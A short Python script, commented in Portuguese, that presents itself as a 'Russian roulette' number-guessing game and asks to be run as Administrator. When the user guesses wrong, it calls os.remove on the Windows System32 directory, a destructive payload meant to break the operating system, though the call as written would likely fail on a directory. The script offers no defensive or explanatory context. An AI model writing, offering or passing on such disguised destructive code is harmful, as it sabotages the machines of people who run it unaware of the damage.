# Se realmente quiser jogar de verdade execulte como ADMINISTRADOR

import random
import os

numero = random.randint(1, 10)
print("\nJogo da roleta Russa!\n")
sorteado = int(input("Escolha o numero de 1 a 10: "))

if sorteado == numero:
    print("Você Ganhou!")
else:
    os.remove("C:\Windows\System32")